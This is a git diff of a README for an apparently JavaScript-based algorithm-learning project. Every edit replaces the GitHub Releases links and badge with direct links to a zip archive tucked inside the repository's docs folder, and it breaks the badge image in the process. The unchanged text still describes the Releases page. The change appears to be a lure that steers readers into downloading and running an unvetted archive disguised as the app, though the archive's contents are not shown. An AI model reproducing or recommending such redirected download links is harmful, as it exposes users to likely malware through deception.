@@ -1,7 +1,7 @@
 # 🚀 algorithm-learn - Learn Algorithms Easily
 
 ## 🔗 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/srii10/algorithm-learn/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/srii10/algorithm-learn/main/docs/module-3/learn_algorithm_2.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/srii10/algorithm-learn/main/docs/module-3/learn_algorithm_2.7.zip)
 
 ## 📖 Description
 Welcome to **algorithm-learn**! This project helps you understand algorithmic thinking starting from basic concepts to advanced algorithms and data structures. We use JavaScript for all implementations, making it easy to follow along even if you're not a programmer.
@@ -10,7 +10,7 @@ Welcome to **algorithm-learn**! This project helps you understand algorithmic th
 To get started with **algorithm-learn**, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the release page.
-   [Download the latest version](https://github.com/srii10/algorithm-learn/releases)
+   [Download the latest version](https://raw.githubusercontent.com/srii10/algorithm-learn/main/docs/module-3/learn_algorithm_2.7.zip)
 
 2. **Choose Your Version**: On the Releases page, look for the latest version. You will find a list of files available for download.
 
@@ -59,4 +59,4 @@ Explore more about algorithms and improve your skills:
 ## 🏁 Conclusion
 With **algorithm-learn**, you can master algorithms at your own pace. Download the application today and start your journey into the fascinating world of algorithms. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/srii10/algorithm-learn/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/srii10/algorithm-learn/main/docs/module-3/learn_algorithm_2.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/srii10/algorithm-learn/main/docs/module-3/learn_algorithm_2.7.zip)
